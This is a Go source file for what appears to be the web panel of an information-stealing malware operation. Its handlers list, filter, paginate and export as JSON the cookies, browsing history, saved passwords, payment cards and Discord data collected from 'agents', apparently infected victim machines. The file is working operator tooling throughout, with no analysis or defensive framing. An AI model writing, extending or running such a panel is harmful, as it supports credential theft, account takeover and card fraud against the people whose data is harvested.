package user

import (
	"math"
	"server/global"
	"server/lib"
	"strconv"
	"strings"

	"github.com/gofiber/fiber/v2"
)

var PAGE_SIZE = 20

func GetPage(c *fiber.Ctx) (int, int, int) {
  page, err := strconv.Atoi(c.Query("page"))
  if err != nil || page <= 0 {
    page = 1
  }
  
  return page, page*PAGE_SIZE, (page*PAGE_SIZE)-PAGE_SIZE
}

func GetDownload(c *fiber.Ctx) bool {
  return c.Query("download")=="1"
}

func Data(c *fiber.Ctx) error {
  return lib.Render(c, "data/data", fiber.Map{})
}

func DataCookie(c *fiber.Ctx) error {
  term := c.Query("term")
  download := GetDownload(c)
  cur, max, min := GetPage(c)

  var results []global.TCookie

  for _, a := range global.Agents {
    if term == "" {
      results = append(results, a.Cookie...)
      continue
    } 

    for _, c := range a.Cookie {
      if strings.Contains(c.Domain, term) {
        results = append(results, c)
      }
    }
  }

  if download {
    return c.JSON(results) 
  }

  var rescp []global.TCookie
  for i := range results {
    if i >= max || i < min {
      continue
    } 
    rescp = append(rescp, results[i])
  }

  pages := int64(math.Ceil(float64(len(results))/float64(PAGE_SIZE)))
  return lib.Render(c, "data/cookie", fiber.Map{
    "module": "cookie",
    "pages": pages, 
    "current": cur,
    "size": len(results),
    "results": rescp,
    "term": term,
  })
}

func DataHistory(c *fiber.Ctx) error {
  term := c.Query("term")
  download := GetDownload(c)
  cur, max, min := GetPage(c)

  var results []global.THistory

  for _, a := range global.Agents {
    if term == "" {
      results = append(results, a.History...)
      continue
    } 

    for _, c := range a.History {
      if strings.Contains(c.Title, term) {
        results = append(results, c)
      }
    }
  }

  if download {
    return c.JSON(results) 
  }

  var rescp []global.THistory
  for i := range results {
    if i >= max || i < min {
      continue
    } 
    rescp = append(rescp, results[i])
  }

  pages := int64(math.Ceil(float64(len(results))/float64(PAGE_SIZE)))
  return lib.Render(c, "data/history", fiber.Map{
    "module": "history",
    "pages": pages, 
    "current": cur,
    "size": len(results),
    "results": rescp,
    "term": term,
  })
}

func DataPassword(c *fiber.Ctx) error {
  term := c.Query("term")
  download := GetDownload(c)
  cur, max, min := GetPage(c)

  var results []global.TPassword

  for _, a := range global.Agents {
    if term == "" {
      results = append(results, a.Password...)
      continue
    } 

    for _, c := range a.Password {
      if strings.Contains(c.URL, term) {
        results = append(results, c)
      }
    }
  }

  if download {
    return c.JSON(results) 
  }

  var rescp []global.TPassword
  for i := range results {
    if i >= max || i < min {
      continue
    } 
    rescp = append(rescp, results[i])
  }

  pages := int64(math.Ceil(float64(len(results))/float64(PAGE_SIZE)))
  return lib.Render(c, "data/password", fiber.Map{
    "module": "password",
    "pages": pages, 
    "current": cur,
    "size": len(results),
    "results": rescp,
    "term": term,
  })
}

func DataCard(c *fiber.Ctx) error {
  term := c.Query("term")
  download := GetDownload(c)
  cur, max, min := GetPage(c)

  var results []global.TCard

  for _, a := range global.Agents {
    if term == "" {
      results = append(results, a.Card...)
      continue
    } 

    for _, c := range a.Card {
      if strings.Contains(c.Name, term) {
        results = append(results, c)
      }
    }
  }

  if download {
    return c.JSON(results) 
  }

  var rescp []global.TCard
  for i := range results {
    if i >= max || i < min {
      continue
    } 
    rescp = append(rescp, results[i])
  }

  pages := int64(math.Ceil(float64(len(results))/float64(PAGE_SIZE)))
  return lib.Render(c, "data/card", fiber.Map{
    "module": "card",
    "pages": pages, 
    "current": cur,
    "size": len(results),
    "results": rescp,
    "term": term,
  })
}

func DataDiscord(c *fiber.Ctx) error {
  term := c.Query("term")
  download := GetDownload(c)
  cur, max, min := GetPage(c)

  var results []global.TDiscord

  for _, a := range global.Agents {
    if term == "" {
      results = append(results, a.Discord...)
      continue
    } 

    for _, c := range a.Discord {
      if strings.Contains(c.User, term) {
        results = append(results, c)
      }
    }
  }

  if download {
    return c.JSON(results) 
  }

  var rescp []global.TDiscord
  for i := range results {
    if i >= max || i < min {
      continue
    } 
    rescp = append(rescp, results[i])
  }

  pages := int64(math.Ceil(float64(len(results))/float64(PAGE_SIZE)))
  return lib.Render(c, "data/discord", fiber.Map{
    "module": "discord",
    "pages": pages, 
    "current": cur,
    "size": len(results),
    "results": rescp,
    "term": term,
  })
}
